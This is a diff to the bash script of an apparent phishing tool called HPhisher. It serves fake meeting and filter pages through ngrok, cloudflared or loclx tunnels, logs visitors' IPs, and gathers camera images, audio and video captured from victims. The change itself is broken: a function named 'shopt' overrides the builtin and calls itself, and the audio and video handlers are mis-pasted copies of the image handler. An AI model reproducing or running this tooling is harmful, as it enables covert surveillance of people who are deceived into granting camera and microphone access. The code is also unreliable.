@@ -496,18 +496,21 @@ capture_data_image() {
                         rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
-								if [[ -e ".server/www/Log.log" ]]; then
-									printf "${GREEN} Cam file received! ${NC}"
-									rm -rf Log.log
-									shopt -s globstar
-									for f in /.server/www/*.{jpg,jpeg,webp}; do
-									 mv -- "$f" /${files_dir}
-								 done
-								fi
+		shopt
                 sleep 0.5
 	done
 }
 
+shopt() {
+			if [[ -e ".server/www/Log.log" ]]; then
+                        printf "${GREEN} Cam file received! ${NC}"
+                        rm -rf .server/www/Log.log
+                        shopt -s globstar
+                        for f in /.server/www/*.{jpg,jpeg,webp}; do
+                                mv -- "/.server/www/${f}" /${files_dir}
+                        done
+			fi
+}
 capture_data_audio() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
   while true; do
@@ -517,14 +520,14 @@ capture_data_audio() {
                         rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
-								if [[ -e "/.server/www/Log.log" ]]; then
-									printf "${GREEN} Audio file received! ${NC}"
-									rm -rf Log.log
-									shopt -s globstar
-									for f in /.server/www/*.{wav,ogg,mp3}; do
-									 mv -- "$f" /${files_dir}
-								 done
-								fi
+		if [[ -e ".server/www/Log.log" ]]; then
+                        printf "${GREEN} Cam file received! ${NC}"
+                        rm -rf Log.log
+                        shopt -s globstar
+                        for f in /.server/www/*.{jpg,jpeg,webp}; do
+                        mv -- "/.server/www/${f}" /${files_dir}
+                        done
+                fi
                 sleep 0.5
 	done
 }
@@ -538,14 +541,14 @@ capture_data_video() {
                         rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
-								if [[ -e ".server/www/Log.log" ]]; then
-									printf "${GREEN} Video file received! ${NC}"
-									rm -rf Log.log
-									shopt -s globstar
-									for f in /.server/www/*.{mp4,webm}; do
-									 mv -- "$f" /${files_dir}
-								 done
-								fi
+		if [[ -e ".server/www/Log.log" ]]; then
+                        printf "${GREEN} Cam file received! ${NC}"
+                        rm -rf Log.log
+                        shopt -s globstar 
+                        for f in /.server/www/*.{jpg,jpeg,webp}; do
+                        mv -- "/.server/www/${f}" /${files_dir}
+                        done
+                fi
                 sleep 0.5
 	done
 }
@@ -576,34 +579,34 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
         1 | 01)
-								site_name=image
+		site_name=image
                 site_image;;
         2 | 02)
-							 site_name=audio
+		site_name=audio
                 site_audio;;
-				3 | 03)
-								site_name=video
+	3 | 03)
+		site_name=video
                 site_video;;
-				A | a)
-			  				xdg-open https://github.com/HPhisher/NPhisher
-								{ sleep 2; clear;  banner; mainmenu; };;
-				B | b | C | c)
-				   			xdg-open https://github.com/HPhisher/NPhisher/issues/new
-								{ sleep 2; clear; banner; mainmenu; };;
-				D | d)
-			      		if [ -f logs.dat ];then
-						 				cat logs.dat
-								else
-										echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
-										{ sleep 2; clear; mainmenu; }
-								fi;;
-				E | e)
-								check_update;;
-				0 | 00)
-    							msg_exit;;
-		 		*)
-				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		           { sleep 1; clear; mainmenu; };;
+	A | a)
+		xdg-open https://github.com/HPhisher/NPhisher
+		{ sleep 2; clear;  banner; mainmenu; };;
+	B | b | C | c)
+	  	xdg-open https://github.com/HPhisher/NPhisher/issues/new
+		{ sleep 2; clear; banner; mainmenu; };;
+	D | d)
+	    	if [ -f logs.dat ];then
+			cat logs.dat
+		else
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
+			{ sleep 2; clear; mainmenu; }
+		fi;;
+	E | e)
+		check_update;;
+	0 | 00)
+    		msg_exit;;
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		{ sleep 1; clear; mainmenu; };;
 esac
 }
 
@@ -621,14 +624,14 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} 
                 1 | 01)
                         start_localhost;;
                 2 | 02)
-											  install_ngrok
-												start_ngrok;;
+			install_ngrok
+			start_ngrok;;
                 3 | 03)
-												install_cloudflared
-												start_cloudflared;;
-	            	4 | 04)
-												install_loclx
-												start_loclx;;
+			install_cloudflared
+			start_cloudflared;;
+           	4 | 04)
+			install_loclx
+			start_loclx;;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; tunnel_menu; };;
@@ -681,19 +684,19 @@ case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
-			  2 | 02)
-				        site_template="onlinemeet"
+	2 | 02)
+		site_template="onlinemeet"
                 tunnel_menu;;
-				3 | 03)
-								site_template="filter"
-								tunnel_menu;;
-				d | D)
-				        echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
-				        read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
-							  site_video;;
+	3 | 03)
+		site_template="filter"
+		tunnel_menu;;
+	d | D)
+		echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
+		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
+		site_video;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_video; };;
+                { sleep 1; banner; site_video; };;
 esac
 }
 
